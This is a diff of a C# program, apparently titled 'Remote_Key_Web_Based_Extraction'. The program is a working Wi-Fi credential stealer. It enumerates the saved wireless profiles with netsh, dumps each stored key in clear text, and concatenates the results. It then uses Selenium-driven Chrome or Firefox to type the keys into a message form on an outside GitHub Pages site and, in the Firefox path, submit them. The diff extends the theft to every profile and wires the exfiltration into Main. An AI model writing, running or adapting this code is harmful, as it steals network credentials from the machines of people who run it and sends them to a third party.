@@ -1,11 +1,8 @@
 using System;
-using Windows.Devices.WiFi;
 using System.Collections.Generic;
-using System.Threading.Tasks;
 using System.Management.Automation;
 //using WindowsInput;
 //using System.Windows.Input;
-using System.Net.Http;
 using OpenQA.Selenium;
 using OpenQA.Selenium.Chrome;
 using OpenQA.Selenium.Edge;
@@ -20,105 +17,61 @@ namespace Remote_Key_Web_Based_Extraction
 {
     class Remote_Key_Web_Based_Extraction
     {
-        static List<string> access_point_names = new List<string>();
-        static List<string> user_profiles_list = new List<string>();
+        private static List<string> user_profiles_list = new List<string>();
 
         static void Main(string[] args)
         {
             Remote_Key_Web_Based_Extraction main_program = new Remote_Key_Web_Based_Extraction();
-            //main_program.test();
             user_profiles_list = main_program.user_profiles_scan();
-            
-            /*
-            var ap_extraction_task = main_program.extract_access_point_names();
-            ap_extraction_task.Wait();
-            string key_content = main_program.local_key_content_extraction();
-            Console.WriteLine("Opportunity to obfuscate key_content:");
-            //string obfuscation = Console.ReadLine();
-            //key_content += obfuscation;
-            //main_program.web_content_key_extraction(access_point_names[0] + ":" + key_content);
-            */
+            string key_contents = main_program.local_key_content_extraction(user_profiles_list);
+            Console.WriteLine(key_contents);
+            main_program.web_content_key_extraction(key_contents);
         }
-
-        /*
-        public void test()
-        {
-            var networks = NetworkListManager.GetNetworks(NetworkConnectivityLevels.Connected);
-            foreach (var network in networks)
-            {
-                var sConnected = (network.IsConnected == true) ? " (connected)" : " (disconnected)";
-                Console.WriteLine("Network : " + network.Name + " - Category : " + network.Category.ToString() + sConnected);
-            }
-        }
-
-        public async Task extract_access_point_names()
-        {
-            // Credits: https://stackoverflow.com/questions/496568/how-do-i-get-the-available-wifi-aps-and-their-signal-strength-in-net?rq=1
-            var adapters = await WiFiAdapter.FindAllAdaptersAsync();
-            foreach (var adapter in adapters)
-            {
-                foreach (var network in adapter.NetworkReport.AvailableNetworks)
-                {
-                    Console.WriteLine($"ssid: {network.Ssid}" + " | " + $"signal strength: {network.SignalBars}");
-                    access_point_names.Add(network.Ssid);
-                }
-            }
-        }
-        */
-
         public List<string> user_profiles_scan()
         {
             List<string> temp_user_profiles_list = new List<string>();
 
-            Console.WriteLine("netsh wlan show profile");
             PowerShell ps = PowerShell.Create();
             ps.AddCommand("netsh")
-                .AddParameter("wlan show profiles");
+                .AddParameter("wlan show", "profiles");
             var results = ps.Invoke();
 
             foreach (var item in results)
             {
-                Console.WriteLine(item);
                 if (item.ToString().Contains("All User Profile"))
                 {
                     string user_profile_name = item.ToString().Substring(item.ToString().IndexOf(":") + 2, item.ToString().Length - (item.ToString().IndexOf(":") + 2));
-                    Console.WriteLine(user_profile_name);
+                    Console.WriteLine("[+] " + user_profile_name);
                     temp_user_profiles_list.Add(user_profile_name);
                 }
             }
             return temp_user_profiles_list;
-
         }
 
-
-        public string local_key_content_extraction()
+        public string local_key_content_extraction(List<string> user_profiles_list)
         {
-            Console.WriteLine("netsh wlan show profile " + access_point_names[0] + " key=clear");
-            PowerShell ps = PowerShell.Create();
-            ps.AddCommand("netsh")
-                .AddParameter("wlan show profile " + access_point_names[0], "key=clear");
-            var results = ps.Invoke();
-
-            foreach (var item in results)
+            string key_set = "";
+            for (int i = 0; i <= user_profiles_list.Count - 1; i++)
             {
-                if (item.ToString().Contains("Key Content"))
+                PowerShell ps = PowerShell.Create();
+                ps.AddCommand("netsh")
+                    .AddParameter("wlan show profile " + user_profiles_list[i], "key=clear");
+                var results = ps.Invoke();
+
+                foreach (var item in results)
                 {
-                    string final_key = item.ToString().Substring(item.ToString().IndexOf(":") + 2, item.ToString().Length - (item.ToString().IndexOf(":") + 2));
-                    return final_key;
+                    if (item.ToString().Contains("Key Content"))
+                    {
+                        string key = item.ToString().Substring(item.ToString().IndexOf(":") + 2, item.ToString().Length - (item.ToString().IndexOf(":") + 2));
+                        key_set += user_profiles_list[i] + ":" + key + "|";
+                        break;
+                    }
                 }
             }
-            return "nil";
+            return key_set;
         }
-        /*
-        public async Task extract_website_password()
-        {
-            HttpClient client = new HttpClient();
-            string s = await client.GetStringAsync("Website-here");
-            s = s.Substring(s.IndexOf("<title>") + "<title>".Length, s.IndexOf("</title>") - s.IndexOf("<title>") - "<title>".Length);
-        }
-        */
 
-        public void web_content_key_extraction(string key_content)
+        public void web_content_key_extraction(string key_contents)
         {
         /*
 
@@ -160,9 +113,9 @@ namespace Remote_Key_Web_Based_Extraction
                 Console.WriteLine("[=] Attempting to try Chrome");
                 OpenQA.Selenium.IWebDriver current_driver = new OpenQA.Selenium.Chrome.ChromeDriver();
                 current_driver.Navigate().GoToUrl(@"https://anthony-t-n.github.io/");
-                current_driver.FindElement(By.Name("message")).SendKeys(key_content);
+                current_driver.FindElement(By.Name("message")).SendKeys(key_contents);
                 //current_driver.FindElement(By.Name("send")).Click();
-                current_driver.Quit();
+                //current_driver.Quit();
             }
             catch (Exception e)
             {
@@ -170,7 +123,7 @@ namespace Remote_Key_Web_Based_Extraction
                 Console.WriteLine("[=] Attempting to try FireFox");
                 OpenQA.Selenium.IWebDriver current_drver = new FirefoxDriver();
                 current_drver.Navigate().GoToUrl("https://anthony-t-n.github.io/");
-                current_drver.FindElement(OpenQA.Selenium.By.Name("message")).SendKeys(key_content);
+                current_drver.FindElement(OpenQA.Selenium.By.Name("message")).SendKeys(key_contents);
                 current_drver.FindElement(OpenQA.Selenium.By.Name("send")).Click();
                 current_drver.Quit();
             }
